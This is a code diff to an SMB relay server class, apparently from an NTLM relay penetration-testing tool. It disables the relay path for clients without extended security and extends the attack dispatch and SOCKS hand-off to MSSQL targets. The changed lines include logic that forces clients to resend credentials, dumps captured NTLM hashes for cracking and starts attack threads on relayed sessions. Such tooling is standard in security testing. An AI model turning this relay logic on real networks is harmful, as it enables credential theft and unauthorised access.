@@ -532,23 +532,26 @@ class SMBRelayServer(Thread):
         else:
             # Process Standard Security
             #TODO: Fix this for other protocols than SMB [!]
-            respParameters = smb.SMBSessionSetupAndXResponse_Parameters()
-            respData       = smb.SMBSessionSetupAndXResponse_Data()
-            sessionSetupParameters = smb.SMBSessionSetupAndX_Parameters(SMBCommand['Parameters'])
-            sessionSetupData = smb.SMBSessionSetupAndX_Data()
-            sessionSetupData['AnsiPwdLength'] = sessionSetupParameters['AnsiPwdLength']
-            sessionSetupData['UnicodePwdLength'] = sessionSetupParameters['UnicodePwdLength']
-            sessionSetupData.fromString(SMBCommand['Data'])
-            connData['Capabilities'] = sessionSetupParameters['Capabilities']
-            #############################################################
+            LOG.critical('Relay with no Extended Security not supported')
+            client = smbData[self.target]['SMBClient']
+            errorCode = STATUS_ACCESS_DENIED
+            #respParameters = smb.SMBSessionSetupAndXResponse_Parameters()
+            #respData       = smb.SMBSessionSetupAndXResponse_Data()
+            #sessionSetupParameters = smb.SMBSessionSetupAndX_Parameters(SMBCommand['Parameters'])
+            #sessionSetupData = smb.SMBSessionSetupAndX_Data()
+            #sessionSetupData['AnsiPwdLength'] = sessionSetupParameters['AnsiPwdLength']
+            #sessionSetupData['UnicodePwdLength'] = sessionSetupParameters['UnicodePwdLength']
+            #sessionSetupData.fromString(SMBCommand['Data'])
+            #connData['Capabilities'] = sessionSetupParameters['Capabilities']
+            ##############################################################
             # SMBRelay
-            smbClient = smbData[self.target]['SMBClient']
-            if sessionSetupData['Account'] != '':
-                #TODO: Fix this for other protocols than SMB [!]
-                clientResponse, errorCode = smbClient.login_standard(sessionSetupData['Account'], sessionSetupData['PrimaryDomain'], sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'])
-            else:
-                # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
-                errorCode = STATUS_ACCESS_DENIED
+            #smbClient = smbData[self.target]['SMBClient']
+            #if sessionSetupData['Account'] != '':
+            #    #TODO: Fix this for other protocols than SMB [!]
+            #    clientResponse, errorCode = smbClient.login_standard(sessionSetupData['Account'], sessionSetupData['PrimaryDomain'], sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'])
+            #else:
+            #    # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
+            #    errorCode = STATUS_ACCESS_DENIED
 
             if errorCode != STATUS_SUCCESS:
                 # Let's return what the target returned, hope the client connects back again
@@ -564,42 +567,42 @@ class SMBRelayServer(Thread):
                 packet['ErrorCode']   = errorCode >> 16
                 packet['ErrorClass']  = errorCode & 0xff
                 # Reset the UID
-                smbClient.setUid(0)
+                client.setUid(0)
                 #Log this target as processed for this client
                 self.targetprocessor.log_target(connData['ClientIP'],self.target)
                 return None, [packet], errorCode
                 # Now continue with the server
-            else:
-                # We have a session, create a thread and do whatever we want
-                ntlm_hash_data = outputToJohnFormat( '', sessionSetupData['Account'], sessionSetupData['PrimaryDomain'], sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'] )
-                logging.info(ntlm_hash_data['hash_string'])
-                if self.server.getJTRdumpPath() != '':
-                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
+            #else:
+            #    # We have a session, create a thread and do whatever we want
+            #    ntlm_hash_data = outputToJohnFormat( '', sessionSetupData['Account'], sessionSetupData['PrimaryDomain'], sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'] )
+            #    logging.info(ntlm_hash_data['hash_string'])
+            #    if self.server.getJTRdumpPath() != '':
+            #        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
+            #
+            #    if self.config.runSocks is True:
+            #        # For now, we only support SOCKS for SMB, for now.
+            #        # Pass all the data to the socksplugins proxy
+            #        activeConnections.put((self.target[1], 445, sessionSetupData['Account'], smbClient, connData))
+            #        logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target[1])
+            #    else:
+            #        #TODO: Fix this for other protocols than SMB [!]
+            #        clientThread = self.config.attacks['SMB'](self.config,smbClient,self.config.exeFile,self.config.command)
+            #        clientThread.start()
+            #
+            #   #Log this target as processed for this client
+            #    self.targetprocessor.log_target(connData['ClientIP'],self.target)
 
-                if self.config.runSocks is True and self.target[0] == 'SMB':
-                    # For now, we only support SOCKS for SMB, for now.
-                    # Pass all the data to the socksplugins proxy
-                    activeConnections.put((self.target[1], 445, sessionSetupData['Account'], smbClient, connData))
-                    logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target[1])
-                else:
-                    #TODO: Fix this for other protocols than SMB [!]
-                    clientThread = self.config.attacks['SMB'](self.config,smbClient,self.config.exeFile,self.config.command)
-                    clientThread.start()
-
-                #Log this target as processed for this client
-                self.targetprocessor.log_target(connData['ClientIP'],self.target)
-
-                # Remove the target server from our connection list, the work is done
-                del (smbData[self.target])
+            #    # Remove the target server from our connection list, the work is done
+            #    del (smbData[self.target])
                 # Now continue with the server
 
             #############################################################
 
             # Do the verification here, for just now we grant access
             # TODO: Manage more UIDs for the same session
-            errorCode = STATUS_SUCCESS
-            connData['Uid'] = 10
-            respParameters['Action'] = 0
+            #errorCode = STATUS_SUCCESS
+            #connData['Uid'] = 10
+            #respParameters['Action'] = 0
 
         respData['NativeOS']     = smbServer.getServerOS()
         respData['NativeLanMan'] = smbServer.getServerOS()
@@ -638,11 +641,11 @@ class SMBRelayServer(Thread):
 
     def do_attack(self,client, connData=None):
         #Do attack. Note that unlike the HTTP server, the config entries are stored in the current object and not in any of its properties
-        if self.target[0] == 'SMB':
+        if self.target[0] == 'SMB' or self.target[0] == 'MSSQL':
             if self.config.runSocks is True:
                 # For now, we only support SOCKS for SMB, for now.
                 # Pass all the data to the socksplugins proxy
-                activeConnections.put((self.target[1], 445, self.authUser, client.session, connData))
+                activeConnections.put((self.target[1], 445, self.authUser, client.session, client.sessionData))
                 logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target[1])
             else:
                 clientThread = self.config.attacks['SMB'](self.config, client.session, self.authUser)
